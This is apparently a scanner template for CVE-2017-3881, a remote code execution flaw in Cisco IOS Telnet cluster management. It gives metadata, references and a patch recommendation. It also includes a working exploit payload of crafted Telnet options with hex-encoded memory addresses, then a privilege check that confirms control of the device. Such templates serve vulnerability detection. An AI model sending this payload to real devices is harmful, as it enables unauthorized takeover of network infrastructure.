id: CVE-2017-3881
info:
  name: Cisco IOS 12.2(55)SE11 - Remote Code Execution
  author: dwisiswant0
  severity: critical
  description: The CVE-2017-3881 vulnerability in Cisco IOS and IOS XE software enables
    an attacker to remotely execute code with elevated privileges or cause a reload
    of an affected device, due to the failure to restrict the use of CMP-specific
    Telnet options and incorrect processing of malformed options.
  reference:
  - https://github.com/artkond/cisco-rce
  - https://artkond.com/2017/04/10/cisco-catalyst-remote-code-execution/
  - https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/dos/cisco/ios_telnet_rocem.md
  - https://nvd.nist.gov/vuln/detail/CVE-2017-3881
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-3881
    cwe-id: CWE-20
  tags: cve2017,cisco,rce,network,kev,msf,cve
  metadata:
    impact: The vulnerability in the Cisco Cluster Management Protocol (CMP) processing
      code has the potential to allow an attacker to remotely execute code with elevated
      privileges, potentially causing a reload of an affected device or taking full
      control of it.
    recommendation: It is strongly recommended to patch all affected Cisco devices
      running IOS and IOS XE software to prevent the exploitation of CVE-2017-3881
      and the potential remote code execution or device reload.
network:
- inputs:
  - data: '{{hex_decode(''fffa240003'')}}CISCO_KITS{{hex_decode(''01'')}}2:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA{{hex_decode(''000037b4023d55dc0000999c'')}}BBBB{{hex_decode(''00e1a9f4'')}}CCCCDDDDEEEE{{hex_decode(''00067b5c023d55c8'')}}FFFFGGGG{{hex_decode(''006cb3a000270b94'')}}HHHHIIII{{hex_decode(''014acf98'')}}JJJJKKKKLLLL{{hex_decode(''0114e7ec'')}}:15:{{hex_decode(''fff0'')}}'
    read: 1024
  - data: show priv
    read: 1024
  host:
  - '{{Hostname}}'
  - '{{Host}}:23'
  read-size: 1024
  matchers:
  - type: word
    words:
    - Current privilege level is
